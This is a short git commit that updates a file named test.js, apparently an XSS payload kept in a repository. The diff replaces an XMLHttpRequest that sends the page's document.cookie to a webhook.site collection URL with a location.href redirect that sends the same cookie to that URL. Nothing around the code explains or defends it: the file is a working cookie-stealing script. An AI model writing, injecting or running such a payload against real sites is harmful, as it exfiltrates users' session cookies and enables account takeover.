0280dfdd21efb7a121bc264d74b5194d47e11a26
wldldlq <smjy01@gmail.com>
2024-09-27 16:46:56 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,2 @@
 var cookieValue = document.cookie;
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "//webhook.site/25357a8b-bbbb-4773-a9c4-c2e64b5e2b06?q=" + encodeURIComponent(cookieValue), true);
-xhr.send();
+location.href = "https://webhook.site/25357a8b-bbbb-4773-a9c4-c2e64b5e2b06?q=".concat(cookieValue);
